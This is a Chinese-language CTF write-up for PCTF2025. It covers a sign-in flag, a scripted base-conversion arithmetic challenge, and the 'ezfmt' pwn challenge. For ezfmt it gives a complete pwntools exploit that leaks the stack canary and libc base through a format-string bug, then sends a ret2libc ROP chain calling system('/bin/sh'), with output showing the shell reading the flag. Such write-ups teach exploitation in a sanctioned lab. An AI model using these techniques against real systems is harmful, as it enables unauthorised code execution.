# [个人队伍] PCTF2025的Writeup



# All

## Misc

### 签到

#### 解题过程

**查看提示**

```shell
"请仔细阅读相关比赛信息，遵守比赛规则，共同营造良好比赛环境

cat /flag

Your flag：PCTF{Welcome_tO_PCTF_2025_!!!!}"
```

**得到：PCTF{Welcome_tO_PCTF_2025_!!!!}**



## Pwn

### test_your_nc

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // r9d
  int v6; // r9d
  int v7; // r9d
  int v8; // r9d
  int v9; // r9d
  char v11; // [rsp+0h] [rbp-2AA0h]
  char v12; // [rsp+0h] [rbp-2AA0h]
  int correct_count; // [rsp+Ch] [rbp-2A94h]
  int i; // [rsp+10h] [rbp-2A90h]
  int numeration; // [rsp+14h] [rbp-2A8Ch]
  int op; // [rsp+1Ch] [rbp-2A84h]
  int64_t b; // [rsp+20h] [rbp-2A80h]
  int64_t number1; // [rsp+28h] [rbp-2A78h]
  int64_t number1a; // [rsp+28h] [rbp-2A78h]
  int64_t number1b; // [rsp+28h] [rbp-2A78h]
  int64_t number2; // [rsp+30h] [rbp-2A70h]
  int64_t number2a; // [rsp+30h] [rbp-2A70h]
  int64_t number2b; // [rsp+30h] [rbp-2A70h]
  int64_t a; // [rsp+38h] [rbp-2A68h]
  char *s; // [rsp+40h] [rbp-2A60h]
  FILE *fp; // [rsp+48h] [rbp-2A58h]
  __mpz_struct ans[1]; // [rsp+50h] [rbp-2A50h] BYREF
  __mpz_struct user_val[1]; // [rsp+60h] [rbp-2A40h] BYREF
  __mpz_struct n1[1]; // [rsp+70h] [rbp-2A30h] BYREF
  __mpz_struct n2[1]; // [rsp+80h] [rbp-2A20h] BYREF
  char buf1[1280]; // [rsp+90h] [rbp-2A10h] BYREF
  char flag[1280]; // [rsp+590h] [rbp-2510h] BYREF
  char input[8200]; // [rsp+A90h] [rbp-2010h] BYREF
  unsigned __int64 v34; // [rsp+2A98h] [rbp-8h]

  v34 = __readfsqword(0x28u);
  banner();
  puts("Welcome to PCTF2025!");
  puts("So let's test your pwntools!");
  correct_count = 0;
  for ( i = 0; i < 2025; ++i )
  {
    if ( get_random() < 0 )
      v3 = -get_random() % 34 + 2;
    else
      v3 = get_random() % 34 + 2;
    numeration = v3;
    if ( v3 <= 1 )
      numeration = 2;
    if ( numeration > 36 )
      numeration = 36;
    if ( get_random() < 0 )
      v4 = -(int)get_random() & 3;
    else
      v4 = get_random() & 3;
    op = v4;
    _gmpz_inits((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v5, v11);
    if ( op )
    {
      if ( op == 1 )
      {
        number1a = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
        number2a = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
        _gmpz_set_si(n1, number1a);
        _gmpz_set_si(n2, number2a);
        _gmpz_sub(ans, n1, n2);
        base_convert_int(number1a, numeration, buf1, 1280);
        base_convert_int(number2a, numeration, flag, 1280);
        printf("[%04d] (base %d) %s - %s = ?\n", i + 1, numeration, buf1, flag);
      }
      else if ( op == 2 )
      {
        number1b = rnd_range_int64(-1000000LL, 1000000LL);
        number2b = rnd_range_int64(-1000000LL, 1000000LL);
        _gmpz_set_si(n1, number1b);
        _gmpz_set_si(n2, number2b);
        _gmpz_mul(ans, n1, n2);
        base_convert_int(number1b, numeration, buf1, 1280);
        base_convert_int(number2b, numeration, flag, 1280);
        printf("[%04d] (base %d) %s * %s = ?\n", i + 1, numeration, buf1, flag);
      }
      else
      {
        a = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
        for ( b = 0LL; !b; b = rnd_range_int64(-1000000LL, 1000000LL) )
          ;
        _gmpz_set_si(n1, a);
        _gmpz_set_si(n2, b);
        _gmpz_mod(ans, n1, n2);
        base_convert_int(a, numeration, buf1, 1280);
        base_convert_int(b, numeration, flag, 1280);
        printf("[%04d] (base %d) %s %% %s = ?\n", i + 1, numeration, buf1, flag);
      }
    }
    else
    {
      number1 = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
      number2 = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
      _gmpz_set_si(n1, number1);
      _gmpz_set_si(n2, number2);
      _gmpz_add(ans, n1, n2);
      base_convert_int(number1, numeration, buf1, 1280);
      base_convert_int(number2, numeration, flag, 1280);
      printf("[%04d] (base %d) %s + %s = ?\n", i + 1, numeration, buf1, flag);
    }
    printf("Your answer (in base %d): ", numeration);
    fflush(stdout);
    if ( !fgets(input, 0x2000, stdin) )
    {
      _gmpz_clears((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v6, v12);
      break;
    }
    trim_trailing_ws(input);
    if ( input[0] )
    {
      if ( (unsigned int)_gmpz_set_str(user_val, input, (unsigned int)numeration) )
      {
        puts("Invalid answer, counted as incorrect.");
        _gmpz_clears((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v8, v12);
      }
      else
      {
        if ( (unsigned int)_gmpz_cmp(user_val, ans) )
        {
          s = (char *)_gmpz_get_str(0LL, (unsigned int)numeration, ans);
          printf("Incorrect. Correct answer: %s\n", s);
          free(s);
        }
        else
        {
          puts("Correct!");
          ++correct_count;
        }
        _gmpz_clears((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v9, v12);
      }
    }
    else
    {
      puts("Empty answer, counted as incorrect.");
      _gmpz_clears((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v7, v12);
    }
  }
  printf("You answered %d out of %d correctly.\n", correct_count, 2025);
  if ( correct_count == 2025 )
  {
    fp = fopen("/flag", "r");
    memset(flag, 0, 256);
    if ( fgets(flag, 256, fp) )
      puts(flag);
    fclose(fp);
  }
  else
  {
    puts("Better luck next time!");
  }
  return 0;
}
```

**分析**

- 没有漏洞

**测试连接**

```shell
nc challenge.imxbt.cn 30809
```

```shell
Welcome to PCTF2025!
So let's test your pwntools!
[0001] (base 23) 4ii06h2gg33l6m * g6f5idg12bgik8 = ?
Your answer (in base 23):
Empty answer, counted as incorrect.
[0002] (base 19) 516ch3a88habi68 + 7986453fg9815b9 = ?
Your answer (in base 19):
Empty answer, counted as incorrect.
[0003] (base 2) 1101100011111100000100001111011100101111000100101011001011001 + 10010000111110000010101011100000111110111001000100011111011001 = ?
Your answer (in base 2):
```

**最终脚本**

```python
def turnBase(num: any, base: any = 10) -> str:
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    if num == 0:
        return "0"
    is_negative = False
    if num < 0:
        is_negative = True
        num = abs(num)
    res = ""
    while num > 0:
        remainder = num % base
        res = chars[remainder] + res
        num = num // base
    return "-" + res if is_negative else res

from pwn import *

r = remote("challenge.imxbt.cn", 30809)

for i in range(2025):
    r.recvuntil("(base ".encode())
    base = int(r.recvuntil(') '.encode()).decode().strip().replace(')', ''))

    a = int(r.recvuntil(' '.encode()).decode().strip(), base)
    op = r.recvuntil(' '.encode()).decode().strip()
    b = int(r.recvuntil(' '.encode()).decode().strip(), base)

    result = ''
    if op.__contains__("+"):
        result = turnBase(a + b, base)
    elif op.__contains__("-"):
        result = turnBase(a - b, base)
    elif op.__contains__("*"):
        result = turnBase(a * b, base)
    elif op.__contains__("%"):
        result = turnBase(a % b, base)

    r.sendlineafter(": ".encode(), result.encode())

    responses = r.recvline().decode().strip()
    print(f"[{i + 1}/2025] (base {base}) {a} {op} {b} = {result} ({responses})")

r.interactive()
```

```shell
[2020/2025] (base 2) 4211585386669123148 - 2462269859783395786 = 1100001000110110100010011010000010100000110010101110010000010 (Correct!)
[2021/2025] (base 2) 1643724213786073034 - 3950050137298789353 = -10000000000001101101110011010100111111010000000000110000011111 (Correct!)
[2022/2025] (base 32) 8219379775512047467 % 3247826166779317823 = 1fqv8v75jjknd (Correct!)
[2023/2025] (base 2) 6308269224368073698 * 1582067913783619215 = 111100000100001100101101101111011000110101011011111100001101100000100100110110011011101010101001100001101010101111100111110 (Correct!)
[2024/2025] (base 2) 6410947805688581131 - 1206696976470622242 = 100100000111001001101101000111001001101100100011000101111101001 (Correct!)
[2025/2025] (base 2) 8189901439791103421 + 4428953678977708416 = 1010111100011111001011011101111101111010010101011010111100111101 (Correct!)
[*] Switching to interactive mode
You answered 2025 out of 2025 correctly.
PCTF{db8b6137-f4d8-4d3f-98fb-ad9c76caf6bd}
[*] Got EOF while reading in interactive
```

**得到：PCTF{db8b6137-f4d8-4d3f-98fb-ad9c76caf6bd}**



### ezfmt

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析**

- Linux64位小端序
- Canary

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[104]; // [rsp+0h] [rbp-70h] BYREF
  unsigned __int64 v5; // [rsp+68h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("What's your id??");
  read(0, buf, 0x100uLL);
  strncpy(name, buf, 0x60uLL);
  printf("Welcome,");
  printf("%s", name);
  puts("Do you wanna say something?");
  read(0, buf, 0x200uLL);
  return 0;
}
```

**分析**

- 存在两个栈溢出和格式化漏洞
- 可用先用第一个输入泄露canary和libc_base_addr
- 然后再用第二个输入执行rop

**数据搜集**

```shell
ropper -f libc.so.6 --search "pop rdi; ret;"
```

```shell
0x000000000002a3e5: pop rdi; ret;
```

```shell
ropper -f libc.so.6 --search "ret;"
```

```shell
0x0000000000029139: ret;
```

```assembly
.data:0000000000404020 name            db '???',0              ; DATA XREF: main+5B↑o
.data:0000000000404020                                         ; main+7E↑o
.data:0000000000404024                 db    0
.data:0000000000404025                 db    0
.data:0000000000404026                 db    0
.data:0000000000404027                 db    0
.data:0000000000404028                 db    0
.data:0000000000404029                 db    0
.data:000000000040402A                 db    0
.data:000000000040402B                 db    0
.data:000000000040402C                 db    0
.data:000000000040402D                 db    0
.data:000000000040402E                 db    0
.data:000000000040402F                 db    0
.data:0000000000404030                 db    0
.data:0000000000404031                 db    0
.data:0000000000404032                 db    0
.data:0000000000404033                 db    0
.data:0000000000404034                 db    0
.data:0000000000404035                 db    0
.data:0000000000404036                 db    0
.data:0000000000404037                 db    0
.data:0000000000404038                 db    0
.data:0000000000404039                 db    0
.data:000000000040403A                 db    0
.data:000000000040403B                 db    0
.data:000000000040403C                 db    0
.data:000000000040403D                 db    0
.data:000000000040403E                 db    0
.data:000000000040403F                 db    0
.data:0000000000404040                 db    0
.data:0000000000404041                 db    0
.data:0000000000404042                 db    0
.data:0000000000404043                 db    0
.data:0000000000404044                 db    0
.data:0000000000404045                 db    0
.data:0000000000404046                 db    0
.data:0000000000404047                 db    0
.data:0000000000404048                 db    0
.data:0000000000404049                 db    0
.data:000000000040404A                 db    0
.data:000000000040404B                 db    0
.data:000000000040404C                 db    0
.data:000000000040404D                 db    0
.data:000000000040404E                 db    0
.data:000000000040404F                 db    0
.data:0000000000404050                 db    0
.data:0000000000404051                 db    0
.data:0000000000404052                 db    0
.data:0000000000404053                 db    0
.data:0000000000404054                 db    0
.data:0000000000404055                 db    0
.data:0000000000404056                 db    0
.data:0000000000404057                 db    0
.data:0000000000404058                 db    0
.data:0000000000404059                 db    0
.data:000000000040405A                 db    0
.data:000000000040405B                 db    0
.data:000000000040405C                 db    0
.data:000000000040405D                 db    0
.data:000000000040405E                 db    0
.data:000000000040405F                 db    0
.data:0000000000404060                 public format
.data:0000000000404060 ; char format[3]
.data:0000000000404060 format          db '%s',0               ; DATA XREF: main+88↑o
```

**分析**

- `name`到`format`之间只有`64`个字符的距离
- 但是`strncpy(name, buf, 0x60uLL)`会将`name`拷贝`96`个字符从而覆盖掉`format`的`%s`造成`printf`无输出
- 我们直接覆盖`format`的内容就好了，不需要用`name`

**最终脚本**

```python
from pwn import *

r = remote("challenge.imxbt.cn", 32255)
libc = ELF("./libc.so.6")

payload = cyclic(64)
payload += "|%19$p|%41$p|".encode()
payload += '\x00'.encode()
r.sendlineafter("?\n".encode(), payload)

r.recvuntil('|'.encode())
canary = int(r.recvuntil('|'.encode()).decode().replace('|', ''), 16)
print("canary", hex(canary))

libc_addr = int(r.recvuntil('|'.encode()).decode().replace('|', ''), 16) - 128
libc_offset = 0x29dc0
libc_base_addr = libc_addr - libc_offset
print("libc_base_addr", libc_base_addr)

pop_rdi_ret_libc_offset = 0x2a3e5
pop_rdi_ret_libc_addr = libc_base_addr + pop_rdi_ret_libc_offset
bin_sh_libc_offset = next(libc.search("/bin/sh".encode()))
bin_sh_libc_addr = libc_base_addr + bin_sh_libc_offset
ret_libc_offset = 0xf8089
ret_libc_addr = libc_base_addr + ret_libc_offset
system_libc_offset = libc.sym["system"]
system_libc_addr = libc_base_addr + system_libc_offset

payload = cyclic(104)
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_libc_addr) + p64(bin_sh_libc_addr) + p64(ret_libc_addr) + p64(system_libc_addr)
r.sendafter("?\n".encode(), payload)

r.interactive()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to challenge.imxbt.cn on port 32255
[x] Opening connection to challenge.imxbt.cn on port 32255: Trying 119.188.240.24
[+] Opening connection to challenge.imxbt.cn on port 32255: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
canary 0xc99f0d36604d4700
libc_base_addr 137025734066176
[*] Switching to interactive mode
ls
attachment
bin
dev
flag
lib
lib32
lib64
libexec
libx32
cat flag
PCTF{dd0a4bf7-f5b6-4332-9c2d-c240a588a8bc}
```

**得到：PCTF{dd0a4bf7-f5b6-4332-9c2d-c240a588a8bc}**